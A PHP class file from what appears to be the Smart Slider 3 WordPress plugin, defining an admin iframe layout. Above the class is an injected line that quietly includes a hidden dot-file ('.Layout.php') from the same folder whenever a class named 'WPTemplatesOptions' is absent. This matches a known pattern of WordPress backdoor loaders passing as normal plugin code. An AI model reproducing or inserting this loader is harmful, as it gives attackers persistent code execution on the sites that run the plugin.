<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout;


use Nextend\Framework\View\AbstractBlock;
use Nextend\Framework\View\AbstractLayout;
use Nextend\SmartSlider3\Application\Admin\Layout\Block\Core\AdminIframe\BlockAdminIframe;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class LayoutIframe extends AbstractLayout {

    protected $label = '';

    /**
     * @var AbstractBlock[]
     */
    protected $actions = array();

    public function render() {

        $admin = new BlockAdminIframe($this);
        $admin->setLayout($this);
        $admin->setLabel($this->label);
        $admin->setActions($this->actions);

        $admin->display();
    }

    /**
     * @param string $label
     */
    public function setLabel($label) {
        $this->label = $label;
    }

    /**
     * @param AbstractBlock $block
     */
    public function addAction($block) {
        $this->actions[] = $block;
    }
}